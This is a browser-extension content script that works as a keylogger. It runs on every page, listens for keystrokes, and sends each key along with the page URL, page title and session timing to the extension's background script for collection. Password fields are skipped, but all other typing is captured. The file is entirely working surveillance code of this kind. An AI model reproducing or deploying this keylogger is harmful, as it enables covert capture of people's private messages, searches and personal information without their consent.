// Content script - runs on every page
(function() {
  'use strict';

  // Check if monitoring is enabled
  chrome.storage.local.get(['monitoring_enabled', 'device_id'], function(result) {
    if (result.monitoring_enabled && result.device_id) {
      startKeylogger(result.device_id);
    }
  });

  // Listen for changes to monitoring status
  chrome.storage.onChanged.addListener(function(changes, namespace) {
    if (changes.monitoring_enabled) {
      if (changes.monitoring_enabled.newValue) {
        chrome.storage.local.get(['device_id'], function(result) {
          if (result.device_id) {
            startKeylogger(result.device_id);
          }
        });
      } else {
        stopKeylogger();
      }
    }
  });

  let isLogging = false;
  let deviceId = null;
  let currentSessionId = null;
  let sessionStartTime = null;
  let sessionKeyCount = 0;
  let typingTimer = null;
  const TYPING_TIMEOUT = 40000;

  function startKeylogger(deviceIdParam) {
    if (isLogging) return;
    isLogging = true;
    deviceId = deviceIdParam;

    document.addEventListener('keydown', handleKeystroke, true);
    console.log('[Keylogger] Started on:', window.location.href);
  }

  function stopKeylogger() {
    isLogging = false;
    document.removeEventListener('keydown', handleKeystroke, true);
    console.log('[Keylogger] Stopped');
  }

  async function handleKeystroke(e) {
    // Skip password fields for security
    if (e.target.type === 'password') return;

    // Reset typing timer
    if (typingTimer) clearTimeout(typingTimer);

    // Start new session if none active
    if (!currentSessionId) {
      currentSessionId = 'sess_' + Date.now() + '_' + Math.random().toString(36).substring(2, 8);
      sessionStartTime = Date.now();
      sessionKeyCount = 0;
    }

    sessionKeyCount++;

    // Send keystroke to background script
    const keystrokeData = {
      device_id: deviceId,
      session_id: currentSessionId,
      key_text: e.key,
      key_code: e.keyCode,
      timestamp: new Date().toISOString(),
      page_url: window.location.href,
      page_title: document.title,
      session_start: new Date(sessionStartTime).toISOString(),
      session_key_count: sessionKeyCount
    };

    // Send to background script
    chrome.runtime.sendMessage({
      type: 'KEYSTROKE',
      data: keystrokeData
    });

    // Set timeout to end session after 40 seconds of inactivity
    typingTimer = setTimeout(endSession, TYPING_TIMEOUT);
  }

  function endSession() {
    if (currentSessionId) {
      chrome.runtime.sendMessage({
        type: 'SESSION_END',
        data: {
          device_id: deviceId,
          session_id: currentSessionId,
          session_end: new Date().toISOString(),
          key_count: sessionKeyCount
        }
      });

      currentSessionId = null;
      sessionStartTime = null;
      sessionKeyCount = 0;
    }
  }

})();
